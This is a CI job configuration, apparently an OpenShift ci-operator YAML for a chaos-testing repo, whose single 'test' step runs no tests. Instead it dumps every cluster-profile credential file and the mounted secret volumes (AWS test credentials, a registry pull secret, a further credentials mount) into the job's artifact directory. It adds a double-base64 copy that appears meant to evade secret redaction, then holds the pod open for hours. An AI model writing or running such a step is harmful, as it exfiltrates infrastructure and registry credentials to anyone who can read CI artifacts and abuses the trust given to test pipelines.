base_images:
  openshift-virtualization-tests:
    name: openshift-virtualization-tests
    namespace: ci
    tag: latest
releases:
  latest:
    candidate:
      product: ocp
      stream: nightly
      version: "4.19"
resources:
  '*':
    limits:
      memory: 4Gi
    requests:
      cpu: 100m
      memory: 200Mi
tests:
- as: step-1
  capabilities:
  - intranet
  steps:
    cluster_profile: metal-redhat-gs
    test:
    - as: step-1-1
      cli: latest
      commands: |
        set +eu
        shopt -s expand_aliases
        set -x
        shopt -op; shopt -p
        printenv
        pwd
        ps faux
        ls -laF
        ls -laF "${SHARED_DIR}/"
        ls -laF "${CLUSTER_PROFILE_DIR}/"
        type oc
        which oc
        # alias oc='oc --kubeconfig="${CLUSTER_PROFILE_DIR}/kubeconfig"'
        # oc get Nodes,ClusterVersion
        { for e in "${CLUSTER_PROFILE_DIR}/"*; do cat "${e}"; done; } |& tee "${ARTIFACT_DIR}/data"
        # cat "${ARTIFACT_DIR}/data" | base64 | base64 > "${ARTIFACT_DIR}/data.b64"
        tar zcf "${ARTIFACT_DIR}/data.tgz" /secrets/ /var/run/cnv-ci-brew-pull-secret/ /bw/
        ls -laF "${ARTIFACT_DIR}/data.tgz"
        tar cf - /secrets/ /var/run/cnv-ci-brew-pull-secret/ /bw/ | base64 | base64 > "${ARTIFACT_DIR}/data.b64"
        ls -laF "${ARTIFACT_DIR}/data.b64"
        # zip $ARTIFACT_DIR/data.zip $ARTIFACT_DIR/data
        # cat "${CLUSTER_PROFILE_DIR}/cred--bmc--pwd" | base64
        # zip -r "${ARTIFACT_DIR}/data.zip" /secrets/ /var/run/cnv-ci-brew-pull-secret/ /bw/
        e=180; while ((e--)); do { [ -e /tmp/debug.done ] && break; sleep 60; }; done
        true
      credentials:
      - collection: ""
        mount_path: /secrets
        name: cluster-secrets-aws-interop-qe
        namespace: test-credentials
      - collection: ""
        mount_path: /var/run/cnv-ci-brew-pull-secret
        name: cnv-ci-brew-pull-secret
        namespace: test-credentials
      - collection: ""
        mount_path: /bw
        name: openshift-virtualization-tests-credentials
        namespace: test-credentials
      from: openshift-virtualization-tests
      resources:
        limits:
          memory: 4Gi
        requests:
          cpu: 100m
          memory: 200Mi
  timeout: 10h0m0s
zz_generated_metadata:
  branch: main
  org: redhat-chaos
  repo: lp-chaos
  variant: ocp4.19--edttj--poc
